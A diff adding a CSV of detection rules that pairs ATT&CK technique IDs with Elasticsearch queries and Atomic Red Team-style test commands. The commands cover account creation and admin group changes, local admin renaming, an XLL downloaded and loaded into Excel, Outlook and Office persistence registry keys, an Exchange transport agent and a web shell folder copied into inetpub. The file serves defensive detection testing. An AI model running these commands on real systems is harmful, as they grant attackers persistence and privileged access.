@@ -1,0 +1,259 @@
+﻿T1098,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"":{""CommandLine"": ""Import-Module ""}},
+                {""match_phrase"":{""CommandLine"": ""Add-WindowsCapability""}},
+                {""match"": {""CommandLine"": ""ActiveDirectory""}},
+                  {""match_phrase"": {""CommandLine"": "" Install-WindowsFeature""}},
+                {""match_phrase"": {""CommandLine"": ""Add-ADGroupMember""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","Try {;
+     Import-Module ActiveDirectory -ErrorAction Stop | Out-Null; ;
+ } ; 
+Catch {;
+     if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1)
+ {;
+   Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online;
+ } 
+else {;
+   Install-WindowsFeature RSAT-AD-PowerShell;
+ };
+}; ;
+$x = Get-Random -Minimum 2 -Maximum 99;
+$y = Get-Random -Minimum 2 -Maximum 99;
+$z = Get-Random -Minimum 2 -Maximum 99;
+$w = Get-Random -Minimum 2 -Maximum 99;
+Import-Module ActiveDirectory; 
+$account = ""#{account_prefix}-$x$y$z""; 
+New-ADUser -Name $account -GivenName ""Test"" -DisplayName $account -SamAccountName $account -Surname $account -Enabled:$False;
+Add-ADGroupMember ""#{group}"" $account",2
+T1098,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""bool"":{
+     ""must"":[
+                        {""match_phrase"": {""CommandLine"": ""Get-LocalGroupMember""}},
+                        {""match"": {""CommandLine"": ""Administrators""}},
+                        {""match_phrase"": {""CommandLine"": ""Get-LocalUser""}}
+                    ]
+     }
+    },
+    {""bool"": {
+                    ""should"":[
+                        {""match_phrase"": {""CommandLine"": ""Set-LocalUser""}},
+                        {""wildcard"": {""CommandLine"": ""Rename-LocalUser""}}
+                    ]
+                }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","$x = Get-Random -Minimum 2 -Maximum 9999; 
+$y = Get-Random -Minimum 2 -Maximum 9999; 
+$z = Get-Random -Minimum 2 -Maximum 9999; 
+$w = Get-Random -Minimum 2 -Maximum 9999; 
+Write-Host HaHa_$x$y$z; 
+$fmm = Get-LocalGroupMember -Group Administrators |?{ $_.ObjectClass -match ""User"" -and $_.PrincipalSource -match ""Local""} | Select Name; foreach($member in $fmm) {;
+     if($member -like ""*Administrator*"") {;
+         $account = $member.Name -replace "".+\\\"","""";        
+$originalDescription = (Get-LocalUser -Name $account).Description;       
+Set-LocalUser -Name $account -Description ""atr:$account;$originalDescription"".Substring(0,48);   
+Rename-LocalUser -Name $account -NewName ""HaHa_$x$y$z"";  
+Write-Host ""Successfully Renamed $account Account on "" $Env:COMPUTERNAME;
+         };
+     }",2
+T1137.006,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                        {""match"":{""CommandLine"": ""URI""}},
+                        {""match_phrase"":{""CommandLine"": ""excel.application""}},
+                        {""wildcard"":{""CommandLine"": ""RegisterXLL""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","powershell -c ""iwr -URI 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/HelloWorldXll.xll' -o '$env:tmp\HelloWorldXll.xll'; 
+IEX ((new-object -ComObject excel.application).RegisterXLL('$env:tmp\HelloWorldXll.xll'))""",2
+T1136.001,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""bool"":{
+     ""must"":[
+                        {""match"": {""CommandLine"": ""/add""}}
+                    ]
+     }
+    },
+               {""bool"":{
+     ""must_not"":[
+                        {""match"": {""CommandLine"": ""/domain""}}
+                    ]
+     }
+    },
+    {""bool"": {
+                    ""should"":[
+                        {""match_phrase"": {""CommandLine"": ""net user""}},
+                        {""match_phrase"": {""CommandLine"": ""net localgroup administrators""}}
+                    ]
+                }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","net user /add ""#{username}"" ""#{password}"" 
+&& net localgroup administrators ""#{username}"" /add
+
+net user /add ""T1136.001_CMD"" ""T1136.001_CMD!""",2
+T1136.001,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [                           
+                            {""match_phrase"":{""CommandLine"": ""New-LocalUser -Name""}}
+                        ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","New-LocalUser -Name ""T1136.001_PowerShell"" -NoPassword",2
+T1136.002,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [                      
+                         
+                            {""wildcard"":{""CommandLine"": ""*.DirectoryServices.AccountManagement""}},
+                            {""wildcard"":{""CommandLine"": ""*.Management.Automation.PSCredential""}},
+                               {""wildcard"":{""CommandLine"": ""*SetPassword""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","$SamAccountName = 'T1136.002_Admin'; 
+$AccountPassword = ConvertTo-SecureString 'T1136_pass123!' -AsPlainText -Force; 
+Add-Type -AssemblyName System.DirectoryServices.AccountManagement; 
+$Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain); 
+$User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context);
+$User.SamAccountName = $SamAccountName;
+$TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword);
+$User.SetPassword($TempCred.GetNetworkCredential().Password); 
+$User.Enabled = $True; 
+$User.PasswordNotRequired = $False
+$User.DisplayName = $SamAccountName;
+$User.Save(); 
+$User",2
+T1136.002,"{
+    ""query"": {
+        ""bool"": {       
+            ""must"": [
+                {""bool"":{
+     ""must"":[
+                  {""match_phrase"":{""CommandLine"": ""/add /domain""}}
+                ]
+     }
+    },
+    {""bool"":{
+     ""should"":[
+                        {""match_phrase"": {""CommandLine"": ""net group""}},
+                        {""match_phrase"":{""CommandLine"": ""net user""}}
+                     ]
+     }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","net user ""#{username}"" ""#{password}"" /add /domain 
+&& net group ""#{group}"" ""#{username}"" /add /domain
+
+
+net user ""ANONYMOUS  LOGON"" ""T1136_pass123!"" /add /domain",2
+T1505.002,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"": ""Install-TransportAgent""}},
+                {""match_phrase"": {""CommandLine"": ""Microsoft.Exchange.Security.Interop.dll""}},
+                {""match_phrase"": {""CommandLine"": ""Enable-TransportAgent""}},
+                {""match_phrase"": {""CommandLine"": ""Get-TransportAgent""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","Install-TransportAgent -Name Security Interop Agent -TransportAgentFactory Microsoft.Exchange.Security.Interop.SecurityInteropAgentFactory -AssemblyPath c:\program files\microsoft\Exchange Server\v15\bin\Microsoft.Exchange.Security.Interop.dll;
+Enable-TransportAgent Security Interop Agent; 
+Get-TransportAgent | Format-List Name,Enabled",2
+T1137.004,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+              
+                {""wildcard"": {""CommandLine"": ""reg*""}},
+                {""match"": {""CommandLine"": ""add""}},
+                {""match"": {""CommandLine"": ""URL""}},
+                {""match_phrase"": {""CommandLine"": ""\\Outlook\\WebView\\Inbox""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}",reg.exe add HKCU\Software\Microsoft\Office\16.0\Outlook\WebView\Inbox /v URL /t REG_SZ /d file://d43bfc_T1137.004.html /f,2
+T1137," {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""wildcard"": {""CommandLine"": ""reg*""}},
+                {""match"": {""CommandLine"": ""add""}},
+                {""match_phrase"": {""CommandLine"": ""Outlook\\Security\\Level""}},
+                {""match_phrase"": {""CommandLine"": ""mkdir""}},
+                {""match_phrase"": {""CommandLine"": ""Microsoft\\Outlook""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","reg add ""HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security\Level"" /t REG_DWORD /d 1 /f 
+&& mkdir  %APPDATA%\Microsoft\Outlook\ >nul 2>&1 
+&& echo ""Atomic Red Team TEST"" > %APPDATA%\Microsoft\Outlook\VbaProject.OTM",2
+T1137.002,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""wildcard"": {""CommandLine"": ""reg*""}},
+                {""match"": {""CommandLine"": ""add""}},
+                {""match_phrase"": {""CommandLine"": ""Microsoft\\Office test\\Special\\Perf""}},
+                {""wildcard"":{""CommandLine"": ""*.dll""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","reg add ""HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf"" /t REG_SZ /d ""C:\Path\AtomicRedTeam.dll""",2
+T1543.003," {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"": ""Get-Service -Name""}},
+                {""match_phrase"": {""CommandLine"": ""Stop-Service""}},
+                {""match_phrase"": {""CommandLine"": ""CurrentControlSet\\Services\\""}}
+                    ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","$s = Get-Service -Name #{host.service.modifiable};
+if ($s.status -ne 'Stopped') { Stop-Service $s };
+$exe = (Get-ItemProperty -Path ""HKLM:\System\CurrentControlSet\Services\#{host.service.modifiable}"").ImagePath.split()[0];
+$path = (Resolve-Path $exe).Path;
+Copy-Item -Path $path -Destination ($path + "".saved"");",2
+T1505.003," {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"": ""xcopy""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}",xcopy /I /Y PathToAtomicsFolder\T1505.003\src\ C:\inetpub\wwwroot,2
